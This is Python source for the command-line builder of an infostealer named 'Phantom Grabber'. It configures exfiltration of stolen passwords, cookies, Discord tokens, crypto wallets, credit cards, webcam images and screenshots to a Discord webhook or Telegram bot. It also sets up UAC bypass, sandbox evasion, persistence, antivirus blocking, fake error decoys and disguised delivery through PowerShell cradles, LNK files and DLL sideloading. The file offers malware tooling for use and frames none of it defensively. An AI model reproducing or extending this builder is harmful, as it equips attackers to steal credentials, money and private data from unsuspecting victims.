#!/usr/bin/env python3
"""
Phantom Grabber — CLI Builder
Usage:
    python build.py --webhook https://discord.com/api/webhooks/xxx
    python build.py --telegram TOKEN$CHATID --no-webcam --startup --melt
"""

import argparse
import json
import os
import sys
import uuid
import logging

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger("PhantomCLI")

BANNER = r"""
    ____  __  _____    _   ____________  __  ___
   / __ \/ / / /   |  / | / /_  __/ __ \/  |/  /
  / /_/ / /_/ / /| | /  |/ / / / / / / / /|_/ / 
 / ____/ __  / ___ |/ /|  / / / / /_/ / /  / /  
/_/   /_/ /_/_/  |_/_/ |_/ /_/  \____/_/  /_/   
                                                 
   ________  ___    ____  ____  __________
  / ____/ / / / |  / /  |/  / / ____/ __ \
 / / __/ /_/ /| | / / /|_/ / / __/ / /_/ /
/ /_/ / __  / | |/ / /  / / / /___/ _, _/ 
\____/_/ /_/  |___/_/  /_/ /_____/_/ |_|  
                                           
         [ P H A N T O M   G R A B B E R ]
              — 2026 Edition —
"""

CONSOLE_MAP = {"none": 0, "force": 1, "debug": 2}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Phantom Grabber — CLI Builder",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example:\n  python build.py --webhook https://discord.com/api/webhooks/xxx --startup --melt",
    )

    c2_group = parser.add_mutually_exclusive_group(required=True)
    c2_group.add_argument("--webhook", type=str, metavar="URL", help="Discord webhook URL")
    c2_group.add_argument(
        "--telegram",
        type=str,
        metavar="ENDPOINT",
        help="Telegram endpoint in TOKEN$CHATID format",
    )

    parser.add_argument("--mutex", type=str, default=uuid.uuid4().hex, help="Mutex name (default: random UUID)")
    parser.add_argument("--password", type=str, default="phantom", help="Archive password (default: phantom)")

    parser.add_argument("--startup", action="store_true", default=False, help="Enable startup persistence")
    parser.add_argument("--melt", action="store_true", default=False, help="Melt after execution")
    parser.add_argument("--uac-bypass", action="store_true", default=False, help="Enable UAC bypass")
    parser.add_argument("--vm-protect", action="store_true", default=False, help="Enable VM/sandbox protection")

    parser.add_argument(
        "--fake-error",
        nargs=3,
        metavar=("TITLE", "MESSAGE", "ICON"),
        default=None,
        help="Show fake error dialog (icon: 0=Error, 1=Question, 2=Warning, 3=Info)",
    )

    parser.add_argument("--bind", type=str, metavar="PATH", default=None, help="Path to executable to bind")
    parser.add_argument("--icon", type=str, metavar="PATH", default=None, help="Path to icon file (.ico)")

    parser.add_argument(
        "--console",
        choices=["none", "force", "debug"],
        default="none",
        help="Console mode (default: none)",
    )

    parser.add_argument("--output", choices=["exe", "py"], default="exe", help="Output format (default: exe)")
    parser.add_argument("--pump", type=int, default=0, metavar="SIZE_MB", help="Pump stub size in MB (default: 0)")
    parser.add_argument("--ping", action="store_true", default=False, help="Ping on execution")
    parser.add_argument("--block-av", action="store_true", default=False, help="Block AV-related sites")
    parser.add_argument("--discord-injection", action="store_true", default=False, help="Enable Discord injection")

    # Delivery method
    parser.add_argument(
        "--delivery",
        choices=["exe", "image", "powershell", "bat", "vbs", "hta", "lnk", "sfx",
                 "dll", "dll_sideload", "all"],
        default="exe",
        help="Delivery method (default: exe = standard compiled EXE)",
    )
    parser.add_argument("--decoy-image", type=str, metavar="PATH", help="Decoy image for image-disguise delivery")
    parser.add_argument("--hosted-url", type=str, metavar="URL", help="Hosted payload URL for PS/LNK cradles")
    parser.add_argument(
        "--dll-name", type=str, metavar="NAME",
        help="Output DLL filename for dll / dll_sideload delivery (e.g. version.dll)",
    )
    parser.add_argument(
        "--sideload-dll", type=str, metavar="PATH",
        help="Path to the real DLL to proxy for dll_sideload delivery. "
             "If omitted, a built-in preset is used (default: version.dll).",
    )

    # Module disable flags — all modules enabled by default
    parser.add_argument("--no-passwords", action="store_true", help="Disable password capture")
    parser.add_argument("--no-cookies", action="store_true", help="Disable cookie capture")
    parser.add_argument("--no-history", action="store_true", help="Disable history capture")
    parser.add_argument("--no-autofills", action="store_true", help="Disable autofill capture")
    parser.add_argument("--no-discord-tokens", action="store_true", help="Disable Discord token capture")
    parser.add_argument("--no-games", action="store_true", help="Disable game session capture")
    parser.add_argument("--no-wifi", action="store_true", help="Disable WiFi password capture")
    parser.add_argument("--no-systeminfo", action="store_true", help="Disable system info capture")
    parser.add_argument("--no-screenshot", action="store_true", help="Disable screenshot capture")
    parser.add_argument("--no-webcam", action="store_true", help="Disable webcam capture")
    parser.add_argument("--no-telegram", action="store_true", help="Disable Telegram session capture")
    parser.add_argument("--no-common-files", action="store_true", help="Disable common file capture")
    parser.add_argument("--no-wallets", action="store_true", help="Disable wallet capture")
    parser.add_argument("--no-exif", action="store_true", help="Disable EXIF data capture")
    parser.add_argument("--no-credit-cards", action="store_true", help="Disable credit card capture")

    return parser.parse_args()


def build_config(args: argparse.Namespace) -> dict:
    """Construct a config dict matching Components/config.json structure."""

    # C2 mode: 0 = Discord webhook, 1 = Telegram
    if args.webhook:
        c2_mode = 0
        c2_endpoint = args.webhook
    else:
        c2_mode = 1
        c2_endpoint = args.telegram

    console_mode = CONSOLE_MAP[args.console]

    # Fake error config
    if args.fake_error:
        fake_error_enabled = True
        fake_error_data = [args.fake_error[0], args.fake_error[1], int(args.fake_error[2])]
    else:
        fake_error_enabled = False
        fake_error_data = ["title", "message", 0]

    config = {
        "settings": {
            "c2": [c2_mode, c2_endpoint],
            "mutex": args.mutex,
            "pingme": args.ping,
            "vmprotect": args.vm_protect,
            "startup": args.startup,
            "melt": args.melt,
            "uacBypass": args.uac_bypass,
            "archivePassword": args.password,
            "consoleMode": console_mode,
            "debug": console_mode == 2,
            "pumpedStubSize": args.pump,
            "boundFileRunOnStartup": args.bind is not None,
        },
        "modules": {
            "captureWebcam": not args.no_webcam,
            "capturePasswords": not args.no_passwords,
            "captureCookies": not args.no_cookies,
            "captureHistory": not args.no_history,
            "captureAutofills": not args.no_autofills,
            "captureDiscordTokens": not args.no_discord_tokens,
            "captureGames": not args.no_games,
            "captureWifiPasswords": not args.no_wifi,
            "captureSystemInfo": not args.no_systeminfo,
            "captureScreenshot": not args.no_screenshot,
            "captureTelegramSession": not args.no_telegram,
            "captureCommonFiles": not args.no_common_files,
            "captureWallets": not args.no_wallets,
            "captureExif": not args.no_exif,
            "captureCreditCards": not args.no_credit_cards,
            "fakeError": [fake_error_enabled, fake_error_data],
            "blockAvSites": args.block_av,
            "discordInjection": args.discord_injection,
        },
    }

    return config


def resolve_icon(icon_path: str | None) -> bytes | None:
    """Read icon file, convert to .ico via PIL if not already .ico format."""
    if icon_path is None:
        return None

    icon_path = os.path.abspath(icon_path)
    if not os.path.isfile(icon_path):
        logger.error(f"Icon file not found: {icon_path}")
        sys.exit(1)

    ext = os.path.splitext(icon_path)[1].lower()
    if ext == ".ico":
        with open(icon_path, "rb") as f:
            return f.read()

    # Convert via PIL
    try:
        from PIL import Image
        import io

        img = Image.open(icon_path)
        buf = io.BytesIO()
        img.save(buf, format="ICO", sizes=[(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)])
        logger.info(f"Converted {ext} -> .ico ({len(buf.getvalue())} bytes)")
        return buf.getvalue()
    except ImportError:
        logger.error("Pillow is required to convert non-.ico images. Install with: pip install pillow")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Failed to convert icon: {e}")
        sys.exit(1)


def write_config(config: dict) -> None:
    """Write config to Components/config.json."""
    config_path = os.path.join(os.path.dirname(__file__), "Components", "config.json")
    os.makedirs(os.path.dirname(config_path), exist_ok=True)
    with open(config_path, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=4)
    logger.info(f"Config written to {config_path}")


def main() -> None:
    print(BANNER)
    args = parse_args()
    config = build_config(args)

    logger.info(f"C2 Mode: {'Discord' if config['settings']['c2'][0] == 0 else 'Telegram'}")
    logger.info(f"Mutex: {config['settings']['mutex']}")
    logger.info(f"Output: {args.output.upper()}")
    logger.info(f"Console: {args.console}")

    # Count enabled modules
    enabled = sum(
        1
        for k, v in config["modules"].items()
        if k != "fakeError" and v is True
    )
    logger.info(f"Enabled modules: {enabled}/{len(config['modules']) - 1}")

    # Write config
    write_config(config)

    # Handle icon
    icon_bytes = resolve_icon(args.icon)
    if icon_bytes:
        icon_cache = os.path.join(os.path.dirname(__file__), "Components", "icon.ico")
        with open(icon_cache, "wb") as f:
            f.write(icon_bytes)
        logger.info(f"Icon cached: {icon_cache} ({len(icon_bytes)} bytes)")

    # Handle bind
    if args.bind:
        bind_path = os.path.abspath(args.bind)
        if not os.path.isfile(bind_path):
            logger.error(f"Bind file not found: {bind_path}")
            sys.exit(1)
        logger.info(f"Bind executable: {bind_path}")

    # Add Components to path and import build pipeline
    components_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Components")
    sys.path.append(components_dir)

    try:
        from process import main as build_main
        from process import WritePythonStub
    except ImportError:
        logger.warning("Components/process.py not found — skipping build step.")
        logger.info("Config has been saved. Run the build manually or use the GUI.")
        return

    match args.output:
        case "exe":
            logger.info("Starting EXE build pipeline...")
            build_main(config, icon_path=args.icon, bind_path=args.bind)
        case "py":
            logger.info("Generating Python stub...")
            WritePythonStub(config)

    logger.info("Build complete.")

    # ── Delivery wrapper generation ─────────────────────────────────
    if args.delivery != "exe" and args.output == "exe":
        logger.info(f"Generating delivery wrapper: {args.delivery}")

        # Locate the built EXE
        built_exe = os.path.join(components_dir, "dist", "Built.exe")
        if not os.path.isfile(built_exe):
            # fallback: check current dir
            for candidate in ("Built.exe", "built.exe"):
                if os.path.isfile(candidate):
                    built_exe = os.path.abspath(candidate)
                    break

        if not os.path.isfile(built_exe):
            logger.error("Cannot find built EXE for delivery wrapping.")
        else:
            try:
                from delivery import DeliveryGenerator
            except ImportError:
                sys.path.insert(0, components_dir)
                from delivery import DeliveryGenerator

            delivery_out = os.path.join(
                os.path.dirname(os.path.abspath(__file__)), "delivery_output"
            )
            result = DeliveryGenerator.generate(
                args.delivery,
                built_exe,
                delivery_out,
                decoy_image=args.decoy_image,
                hosted_url=args.hosted_url,
                dll_name=getattr(args, "dll_name", None),
                sideload_target=getattr(args, "sideload_dll", None),
            )

            if isinstance(result, dict) and "error" not in result:
                logger.info(f"Delivery artifacts saved to: {delivery_out}")
                notes = result.get("notes", "")
                if notes:
                    logger.info(f"  → {notes}")
            elif isinstance(result, dict) and "error" in result:
                logger.error(f"Delivery error: {result['error']}")
            else:
                # 'all' mode returns nested dict
                for method_name, method_result in result.items():
                    if "error" in method_result:
                        logger.error(f"  {method_name}: {method_result['error']}")
                    else:
                        logger.info(f"  {method_name}: {method_result.get('notes', 'OK')}")

    elif args.delivery != "exe" and args.output == "py":
        logger.warning("Delivery wrappers require --output exe (not py).")


if __name__ == "__main__":
    main()
